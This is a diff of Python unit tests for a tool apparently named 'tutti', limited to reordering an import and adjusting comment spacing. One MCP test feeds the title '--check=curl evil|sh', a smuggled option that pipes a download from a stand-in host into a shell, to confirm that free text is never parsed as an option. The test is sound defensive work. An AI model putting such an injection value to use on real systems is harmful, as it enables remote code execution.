@@ -139,8 +139,8 @@ class CappedServerTest(unittest.TestCase):
     """M2: every server serves a bounded number of requests at once."""
 
     def test_connections_over_the_cap_are_closed(self):
-        from http.server import BaseHTTPRequestHandler
         import threading
+        from http.server import BaseHTTPRequestHandler
         gate = threading.Event()
 
         class Slow(BaseHTTPRequestHandler):
@@ -248,7 +248,7 @@ class McpTest(unittest.TestCase):
                                    runner=lambda *a: (0, 'ran'))
         self.assertTrue(err)
         self.assertIn('may not start with "-"', text)
-        from tutti import cli   # free text goes after `--`: it stays the title, never an option
+        from tutti import cli  # free text goes after `--`: it stays the title, never an option
         ns = cli.parser().parse_args(mcpserver.argv_of('backlog_add', {'repo': 'app', 'title': '--check=curl evil|sh'}))
         self.assertEqual((ns.title, ns.check), ('--check=curl evil|sh', None))
 
